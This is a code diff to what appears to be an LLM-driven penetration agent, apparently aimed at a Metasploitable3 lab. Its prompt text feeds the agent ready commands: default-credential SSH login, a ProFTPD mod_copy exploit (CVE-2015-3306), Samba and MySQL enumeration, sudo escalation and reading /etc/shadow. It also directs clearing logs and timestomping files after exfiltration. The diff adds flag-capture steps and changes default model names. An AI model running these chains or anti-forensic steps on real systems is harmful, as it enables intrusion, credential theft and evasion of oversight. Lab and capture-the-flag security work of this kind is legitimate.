@@ -404,25 +404,25 @@ PORTS THAT ARE CLOSED (do NOT attack these):
   • No web server, no Jenkins, no Tomcat, no UnrealIRCd
 
 #1 FASTEST SHELL — SSH DEFAULT CREDS (try FIRST):
-  sshpass -p msfadmin ssh -o StrictHostKeyChecking=no msfadmin@{target} id
+  sshpass -p msfadmin ssh -o StrictHostKeyChecking=no msfadmin@{{target}} id
   → uid=900(msfadmin) gid=900(msfadmin) groups=900(msfadmin),27(sudo)
   → msfadmin is in sudo group → sudo su → root!
   This is the FASTEST path to root on this MS3 Docker.
 
 #2 ProFTPD mod_copy — CVE-2015-3306 (no auth needed):
-  echo -e 'SITE CPFR /etc/passwd\nSITE CPTO /tmp/test' | nc {target} 21
+  echo -e 'SITE CPFR /etc/passwd\nSITE CPTO /tmp/test' | nc {{target}} 21
   → 350 File or directory exists → 250 Copy successful
   Can copy any file anywhere. Use to plant SSH keys or cron jobs.
 
 #3 Samba enumeration:
-  smbclient -L //{target} -N → shares: print$, public, IPC$
-  enum4linux -a {target} → user enumeration
+  smbclient -L //{{target}} -N → shares: print$, public, IPC$
+  enum4linux -a {{target}} → user enumeration
 
 #4 MySQL (needs valid credentials, try root:sploitme):
-  mysql -h {target} -u root -psploitme -e 'show databases'
+  mysql -h {{target}} -u root -psploitme -e 'show databases'
 
 MS3 OPTIMAL ATTACK CHAIN:
-  1. sshpass -p msfadmin ssh msfadmin@{target} id  → instant user shell
+  1. sshpass -p msfadmin ssh msfadmin@{{target}} id  → instant user shell
   2. sudo -l → (ALL) → sudo su → root
   3. cat /etc/shadow → credential harvest
   4. If SSH blocked: ProFTPD mod_copy → plant SSH key → SSH as root
@@ -463,6 +463,23 @@ After exfiltration, ALWAYS close out professionally:
   4. Clear bash history, auth logs, wtmp/btmp, syslog
   5. Timestomp modified files to match system baseline
   6. Verify target stability (uptime, services, disk)
+
+=== FLAG CAPTURE — HIGH PRIORITY ===
+Flags are the ultimate proof of compromise. ALWAYS capture them:
+  • USER FLAG: cat /home/*/user.txt — read immediately after getting user shell
+  • ROOT FLAG: cat /root/root.txt — read immediately after getting root shell
+  • Flag formats: FLAG{{...}}, HTB{{...}}, flag{{...}}, or 32-char hex strings
+  • After obtaining any shell, the FIRST action should be reading the flag file
+  • User flag = proof of initial access, Root flag = proof of full compromise
+
+=== EXPLOIT REASONING METHODOLOGY ===
+Think like a pentester — understand WHY vulnerabilities exist:
+  • DEFAULT CREDENTIALS: Services shipped with known passwords (msfadmin:msfadmin, tomcat:tomcat)
+  • BACKDOORS: Intentionally planted (vsftpd 2.3.4, UnrealIRCd, ingreslock port 1524)
+  • MISCONFIGURATIONS: NFS world-readable, MySQL no-password, writable /etc/passwd
+  • CVEs: Known software bugs (Samba CVE-2007-2447, ProFTPD CVE-2015-3306)
+  • LOOPHOLES: sudo misconfigs, SUID binaries, kernel exploits, Docker group membership
+Chain exploits: identify entry point → escalate privileges → capture flags → exfiltrate
 
 {ms3_knowledge}
 
@@ -1044,7 +1061,7 @@ class DualMentor:
         gpt_client: Any,
         venice_client: Optional[Any] = None,
         gpt_model: str = "gpt-5.1-codex-mini",
-        venice_model: str = "zai-org-glm-4.7-flash",
+        venice_model: str = "qwen3-coder-480b-a35b-instruct",
         learned_store: Optional[LearnedCommandStore] = None,
         strategy: str = "gpt_first",
         temperature: float = 0.7,
@@ -1057,7 +1074,7 @@ class DualMentor:
             gpt_client: OpenAI client for GPT
             venice_client: OpenAI-compatible client for Venice
             gpt_model: GPT model to use
-            venice_model: Venice model to use (default: zai-org-glm-4.7-flash)
+            venice_model: Venice model to use (default: qwen3-coder-480b-a35b-instruct)
             learned_store: Store for learned commands
             strategy: Mentor selection strategy
             temperature: Sampling temperature
@@ -1358,7 +1375,7 @@ def create_dual_mentor(
     gpt_client: Any,
     venice_client: Optional[Any] = None,
     gpt_model: str = "gpt-5.1-codex-mini",
-    venice_model: str = "zai-org-glm-4.7-flash",
+    venice_model: str = "qwen3-coder-480b-a35b-instruct",
     strategy: str = "gpt_first",
     temperature: float = 0.7
 ) -> DualMentor:
